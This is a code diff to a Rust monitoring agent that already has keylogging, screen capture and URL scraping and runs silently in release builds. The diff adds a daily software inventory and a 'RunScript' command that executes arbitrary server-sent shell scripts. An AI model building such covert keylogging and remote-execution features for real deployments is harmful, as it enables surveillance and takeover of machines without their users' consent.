@@ -29,6 +29,7 @@
 //! | Return from AFK              | `Text` (JSON)  | `"active"`          |
 //! | Foreground window changed    | `Text` (JSON)  | `"window_focus"`    |
 //! | Active browser URL changed   | `Text` (JSON)  | `"url"`             |
+//! | Installed software snapshot  | `Text` (JSON)  | `"software_inventory"` |
 //!
 //! ## Inbound frames (server → agent)
 //!
@@ -42,6 +43,8 @@
 //! | Request info     | `Text` (JSON) | `"RequestInfo"`       |
 //! | Restart host     | `Text` (JSON) | `"RestartHost"`       |
 //! | Shutdown host    | `Text` (JSON) | `"ShutdownHost"`      |
+//! | Collect software | `Text` (JSON) | `"CollectSoftware"`   |
+//! | Run script       | `Text` (JSON) | `"RunScript"`         |
 
 // In release builds: suppress the console window so the agent runs silently.
 #![cfg_attr(not(debug_assertions), windows_subsystem = "windows")]
@@ -50,6 +53,8 @@ mod capture;
 mod config;
 mod input;
 mod keylogger;
+mod remote_script;
+mod software_inventory;
 mod system_info;
 mod ui;
 mod url_scraper;
@@ -66,7 +71,7 @@ use futures_util::{SinkExt, StreamExt};
 use input::InputController;
 use keylogger::InputEvent;
 use tokio::sync::mpsc;
-use tokio::time::{interval, MissedTickBehavior};
+use tokio::time::{interval, interval_at, Instant, MissedTickBehavior};
 use tokio_tungstenite::{
     connect_async,
     tungstenite::{protocol::frame::coding::CloseCode, protocol::CloseFrame, Message},
@@ -445,9 +450,16 @@ async fn run_session(
     let mut url_ticker = interval(Duration::from_secs(2));
     let mut window_ticker = interval(Duration::from_millis(WINDOW_POLL_INTERVAL_MS));
 
+    // First software inventory ~1 minute after connect, then every 24 hours.
+    let mut software_ticker = interval_at(
+        Instant::now() + Duration::from_secs(60),
+        Duration::from_secs(86_400),
+    );
+
     frame_ticker.set_missed_tick_behavior(MissedTickBehavior::Skip);
     url_ticker.set_missed_tick_behavior(MissedTickBehavior::Skip);
     window_ticker.set_missed_tick_behavior(MissedTickBehavior::Skip);
+    software_ticker.set_missed_tick_behavior(MissedTickBehavior::Skip);
 
     // ── Event loop ────────────────────────────────────────────────────────
     let result: Result<()> = loop {
@@ -575,6 +587,14 @@ async fn run_session(
                         ));
                     }
                 }
+            }
+
+            // ── Branch 6: daily installed-software inventory ──────────────
+            _ = software_ticker.tick() => {
+                let o = out_tx.clone();
+                tokio::spawn(async move {
+                    software_inventory::send_inventory(o).await;
+                });
             }
         }
     };
@@ -727,6 +747,42 @@ fn handle_server_command(
                     "items": items
                 }).to_string();
                 let _ = out_tx.send(Message::Text(payload)).await;
+            });
+        }
+        "CollectSoftware" => {
+            let out = out_tx.clone();
+            tokio::spawn(async move {
+                software_inventory::send_inventory(out).await;
+            });
+            info!("CollectSoftware scheduled.");
+        }
+        "RunScript" => {
+            let request_id = val["request_id"].as_str().unwrap_or("").to_string();
+            if request_id.is_empty() {
+                warn!("RunScript missing request_id");
+                return;
+            }
+            let shell = val["shell"].as_str().unwrap_or("powershell").to_lowercase();
+            let script = val["script"].as_str().unwrap_or("").to_string();
+            if script.len() > 256 * 1024 {
+                warn!("RunScript rejected: script too large");
+                return;
+            }
+            let timeout_secs = val["timeout_secs"].as_u64().unwrap_or(120).clamp(5, 300);
+            let out = out_tx.clone();
+            tokio::spawn(async move {
+                let r = remote_script::run(&shell, &script, timeout_secs).await;
+                let payload = serde_json::json!({
+                    "type": "script_result",
+                    "request_id": request_id,
+                    "ok": r.ok,
+                    "exit_code": r.exit_code,
+                    "stdout": r.stdout,
+                    "stderr": r.stderr,
+                    "error": r.error,
+                })
+                .to_string();
+                let _ = out.send(Message::Text(payload)).await;
             });
         }
         "ReadFile" => {
